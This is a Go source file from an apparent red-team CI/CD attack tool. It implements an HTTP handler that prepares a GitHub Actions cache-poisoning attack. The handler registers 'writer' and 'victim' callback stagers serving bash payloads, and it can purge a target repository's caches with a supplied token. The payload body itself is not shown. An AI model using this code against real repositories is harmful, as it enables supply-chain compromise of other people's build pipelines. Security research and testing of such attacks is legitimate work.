// Copyright (C) 2026 boostsecurity.io
// SPDX-License-Identifier: AGPL-3.0-or-later

package kitchen

import (
	"encoding/json"
	"fmt"
	"net/http"
	"time"

	"github.com/boostsecurityio/smokedmeat/internal/cachepoison"
	"github.com/boostsecurityio/smokedmeat/internal/stagerurl"
)

type prepareCachePoisonRequest struct {
	SessionID        string                      `json:"session_id"`
	ExternalURL      string                      `json:"external_url"`
	WriterStagerID   string                      `json:"writer_stager_id"`
	WriterRepository string                      `json:"writer_repository"`
	WriterWorkflow   string                      `json:"writer_workflow"`
	WriterJob        string                      `json:"writer_job"`
	Victim           cachepoison.VictimCandidate `json:"victim"`
	VictimDwellTime  string                      `json:"victim_dwell_time,omitempty"`
	PurgeToken       string                      `json:"purge_token,omitempty"`
	PurgeKey         string                      `json:"purge_key,omitempty"`
	PurgeKeyPrefix   string                      `json:"purge_key_prefix,omitempty"`
	PurgeRef         string                      `json:"purge_ref,omitempty"`
}

type prepareCachePoisonResponse struct {
	VictimCallback   CallbackSummary `json:"victim_callback"`
	WriterCallback   CallbackSummary `json:"writer_callback"`
	VictimStagerID   string          `json:"victim_stager_id"`
	VictimStagerURL  string          `json:"victim_stager_url"`
	PurgedCacheCount int             `json:"purged_cache_count,omitempty"`
	PurgedKey        string          `json:"purged_key,omitempty"`
	PurgedCacheRef   string          `json:"purged_cache_ref,omitempty"`
	PurgedKeyPrefix  string          `json:"purged_key_prefix,omitempty"`
}

func (h *Handler) handlePrepareCachePoison(w http.ResponseWriter, r *http.Request) {
	var req prepareCachePoisonRequest
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		http.Error(w, "invalid request body", http.StatusBadRequest)
		return
	}
	defer r.Body.Close()

	if req.SessionID == "" || req.ExternalURL == "" || req.WriterStagerID == "" {
		http.Error(w, "session_id, external_url, and writer_stager_id are required", http.StatusBadRequest)
		return
	}
	if req.Victim.Repository == "" || req.Victim.Workflow == "" || req.Victim.Job == "" {
		http.Error(w, "victim repository, workflow, and job are required", http.StatusBadRequest)
		return
	}

	var purgedCacheCount int
	var purgedCacheRef string
	if req.PurgeToken != "" && (req.PurgeKey != "" || req.PurgeKeyPrefix != "") {
		client := newGitHubClient(req.PurgeToken)
		var err error
		purgedCacheRef, purgedCacheCount, err = client.purgeActionsCaches(r.Context(), req.Victim.Repository, req.PurgeKey, req.PurgeKeyPrefix, req.PurgeRef)
		if err != nil {
			http.Error(w, err.Error(), http.StatusBadRequest)
			return
		}
	}

	victimStagerID := generateCachePoisonStagerID()
	victimStagerURL := stagerurl.Join(req.ExternalURL, victimStagerID)

	cfg := cachepoison.DeploymentConfig{
		Candidate:        req.Victim,
		VictimStagerURL:  victimStagerURL,
		VictimCallbackID: victimStagerID,
	}
	encoded, err := cfg.Encode()
	if err != nil {
		http.Error(w, err.Error(), http.StatusBadRequest)
		return
	}

	var victimDwell time.Duration
	if req.VictimDwellTime != "" {
		victimDwell, err = time.ParseDuration(req.VictimDwellTime)
		if err != nil {
			http.Error(w, "invalid victim_dwell_time", http.StatusBadRequest)
			return
		}
	}

	now := time.Now()
	victim := &RegisteredStager{
		ID:           victimStagerID,
		ResponseType: "bash",
		SessionID:    req.SessionID,
		CreatedAt:    now,
		DwellTime:    victimDwell,
		Persistent:   true,
		DefaultMode:  CallbackModeExpress,
		Metadata: map[string]string{
			"repository":         req.Victim.Repository,
			"workflow":           req.Victim.Workflow,
			"job":                req.Victim.Job,
			"cache_poison_stage": "victim",
			"callback_label":     fmt.Sprintf("Cache poison victim · %s", req.Victim.Workflow),
		},
	}
	if err := h.registerStager(victim); err != nil {
		http.Error(w, err.Error(), http.StatusServiceUnavailable)
		return
	}

	writer := &RegisteredStager{
		ID:           req.WriterStagerID,
		ResponseType: "bash",
		Payload:      buildCachePoisonWriterPayload(encoded),
		SessionID:    req.SessionID,
		CreatedAt:    now,
		Persistent:   true,
		DefaultMode:  CallbackModeExpress,
		Metadata: map[string]string{
			"repository":                   req.WriterRepository,
			"workflow":                     req.WriterWorkflow,
			"job":                          req.WriterJob,
			"cache_poison_stage":           "writer",
			"cache_poison_victim_workflow": req.Victim.Workflow,
			"cache_poison_victim_job":      req.Victim.Job,
			"cache_poison_victim_strategy": req.Victim.Strategy,
			"cache_poison_victim_consumer": req.Victim.ConsumerLabel,
			"callback_label":               fmt.Sprintf("Cache poison writer · %s", req.WriterWorkflow),
		},
	}
	if err := h.registerStager(writer); err != nil {
		http.Error(w, err.Error(), http.StatusServiceUnavailable)
		return
	}

	resp := prepareCachePoisonResponse{
		VictimCallback:   callbackSummary(victim),
		WriterCallback:   callbackSummary(writer),
		VictimStagerID:   victimStagerID,
		VictimStagerURL:  victimStagerURL,
		PurgedCacheCount: purgedCacheCount,
		PurgedKey:        req.PurgeKey,
		PurgedCacheRef:   purgedCacheRef,
		PurgedKeyPrefix:  req.PurgeKeyPrefix,
	}
	w.Header().Set("Content-Type", "application/json")
	w.WriteHeader(http.StatusOK)
	_ = json.NewEncoder(w).Encode(resp)
}

func buildCachePoisonWriterPayload(encodedConfig string) string {
	return authenticatedBashPayloadTemplate(
		[]string{fmt.Sprintf(`CACHE_POISON_CONFIG=%q`, encodedConfig)},
		` -cache-poison "$CACHE_POISON_CONFIG"`,
	)
}

func generateCachePoisonStagerID() string {
	return stagerurl.GenerateID()
}
